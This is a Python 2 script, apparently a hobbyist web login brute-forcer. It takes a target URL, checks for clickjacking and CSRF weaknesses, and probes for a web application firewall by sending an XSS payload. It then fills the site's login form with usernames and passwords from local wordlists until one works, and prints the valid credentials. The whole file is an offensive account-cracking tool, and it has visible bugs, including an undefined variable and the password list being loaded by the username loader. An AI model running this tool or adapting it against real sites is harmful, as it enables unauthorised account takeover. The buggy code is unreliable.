#!/usr/bin/python

import mechanize
import itertools
import cookielib
import sys
from bs4 import BeautifulSoup
from re import search , findall
from urllib import urlopen
from urllib2 import URLError

#Initializing Mechanize
br = mechanize.Browser()
cookies = cookielib.LWPCookieJar()
br.set_cookiejar(cookies)

#Mechanize Settings
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_debug_http(False)
br.set_debug_responses(False)
br.set_debug_redirects(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1 )
br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'), ('Accept-Encoding','br')]

print((56 * '\033[31m-\033[1;m'))
print "\033[1;32mBRUTER : Made By Kunal \033[1;m"
print((56 * '\033[31m-\033[1;m'))

#Take URL as Input from User 
url = raw_input('\033[1;34m[?]\033[0m Enter Target URL: ')
if 'http://' in url:
    pass
elif 'https://' in url:
    url = url.replace('https://','http://')
else:
    url = 'http://' + url

#Open the URL
try:
    br.open(url, timeout=10.0)
except URLError as e:
    url = 'https://' + url
    br.open(url)

#Find out all the forms
forms = br.forms()

#Store the headers 
headers = str(urlopen(url).headers.headers).lower()

#Basic Vulnerability Check
if 'x-frame-options:' not in headers:
    print '\033[1;32m[+]\033[0m Clickjacking Vulnerability maybe Present'
if 'cloudfare-nginx' in headers:
    print '\033[1;32m[+]\033[0m Target is Protected By CloudFare'


#Fetch the data and read Response
data = br.open(url).read() 
if 'type="hidden"' not in data:
    print '\033[1;32m[+]\033[0m CSRF Vulnerability maybe Present'

#Parse the response and save title in Original
soup = BeautifulSoup(data, 'lxml')
i_title = soup.find('title')
if i_title != None:
    original = i_title.contents 

def WAF_detector():
    noise = "?=<script>alert()</script>" #XSS Payload
    fuzz = url + noise
    res1 = urlopen(fuzz) 
    
    if res1.code == 406 or res1.code == 501:
        print"\033[1;31m[-]\033[1;m WAF Detected : Mod_Security"
    elif res1.code == 999:
        print"\033[1;31m[-]\033[1;m WAF Detected : WebKnight"
    elif res1.code == 419:
        print"\033[1;31m[-]\033[1;m WAF Detected : F5 BIG IP"
    elif res1.code == 403: 
        print "\033[1;31m[-]\033[1;m Unknown WAF Detected"

WAF_detector()

#Load Usernames from list

def wordlist_u(lst):
    try:
        with open('unames.txt','r') as f:
            for line in f:
                finalStr = str(line.replace("\n",""))
                lst.append(finalStr)
    except IOError:
        print "\033[1;31m[-]\033[1;mWordlist not found!"
        quit()

def wordlist_p(lst):
    try:
        with open('passwords.txt','r') as f:
            for line in f:
                finalStr = str(line.replace("\n",""))
                lst.append(final)
    except IOError:
        print "\033[1;31m[-]\033[1;mWordlist not found!"
        quit()

usernames = []
wordlist_u(usernames)
print '\033[1;97m[>]\033[1;mUsernames Loaded: %i'%len(usernames)

passwords = []
wordlist_u(passwords)
print '\033[1;97m[>]\033[1;mPasswords Loaded: %i'%len(passwords)

#Function For finding Forms
def find():
    form_number = 0
    for f in forms: #Finds all the forms in webpage
        data = str(f) #Converts the response recieved to string
        username = search(r'<TextControl\([^<]*=\)>',data) #Searches for fields that accept plain Text

        if username: #If such field is found
            username = (username.group().split('<TextControl(')[1][:-3]) #Extract the name of the field
            print '\033[1;33m[!]\033[1m Username Field: ' + username #prints the name of the field
            passwd = search (r'<PasswordControl\([^<]*=\)>', data) #Searches for field that accept passwords

            if passwd: #if such field is found
                passwd = (passwd.group().split('<PasswordControl(')[1][:-3]) #Extracts the field name
                print '\033[1;33m[!]\033[0mPassword Field: ' + passwd #Prints the name of the field
                select_n = search(r'SelectControl\([^<]*=', data) #Check for other Selectable menus in form

                if select_n: #If a menu is found
                    name = (select_n.group().split('(')[1][:-1]) #Extracts the menu  name 
                    select_o = search(r'SelectControl\([^<]*=[^<]*\)>', data) #Select_o is the name of the menu

                    if select_o: #Proceeds to find options of the menu
                        menu = "True" #Sets the menu to be true
                        options = (select_o.group().split('=')[1][:-1]) #Extracts options
                        print '\n\033[1;33m[!]\033[0m A drop down menu detected.'
                        print '\033[1;33m[!]\033[0m Menu name: ' + name #prints menu name
                        print '\033[1;33m[!]\033[0m Options available: ' + options #prints available options
                        option = raw_input('\033[1;34m[?]\033[0m Please Select an option:>> ') #Gets option from user
        
                        brute(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
                    else:
                        menu = "False" #No menu is present 
                        try:
                            brute(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
                        except Exception as e:
                            cannotUseBruteForce(username , e)
                            pass
                else:
                    menu = "False" #No Menu is present in the form
                    option = "" #Sets option to null
                    name = "" #Sets name to null
                    try:
                        brute(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
                    except Exception as e:
                        cannotUseBruteForce(username, e)
                        pass
            else:
                 form_number += 1
                 pass
    print'\033[1;31m[-]\033[0mNo Forms found'

def cannotUseBruteForce(username, e):
    print '\r\033[1;31m[!]\033[0m Cannot use brute force with user %s.' % username
    print '\r    [Error: %s]' % e.message 

def brute(username, passwd, menu, option, name, form_number):
    for uname in usernames:
        progress = 1
        print '\033[1;97m[>]\033[1;mBruteforcing Username: %s'% uname
        for password in passwords:
            sys.stdout.write('\r\033[1;97m[>]\033[1;m Passwords Tried: %i / %i'% (progress, len(passwords)))
            sys.stdout.flush()
            br.open(url)
            br.select_form(nr=form_number)
            br.form[username] = uname
            br.form[passwd] = password
            if menu == "False":
                pass
            elif menu == "True":
                br.form[name] = [option]
            else:
                pass
            resp = br.submit()
            data = resp.data()
            data_low = data.lower()
            if 'username or password' in data_low:
                pass
            else:
                soup = BeautifulSoup(data, 'lxml')
                i_title = soup.find('title')
                if i_title == None:
                    data = data.lower()
                    if 'logout' in data:
                        print '\n\033[1;32m[+]\033[0m Valid Credentials Found: '
                        print '\033[1;32mUsername: \033[0m' + uname
                        print '\033[1;32mPassword: \033[0m' + password
                        quit()
                    else:
                        pass
                else:
                    injected = i_title.contents
                    if original != injected:
                        print '\n\033[1;32m[+]\033[0m Valid Credentials Found: '
                        print '\033[1;32mUsername: \033[0m' + uname
                        print '\033[1;32mPassword: \033[0m' + password
                        quit()
                    else:
                        pass
                
            progress += 1
        print ''
    print '\033[1;31m[-]\033[0m Failed to Crack Login Credentials'
    quit()

find()


















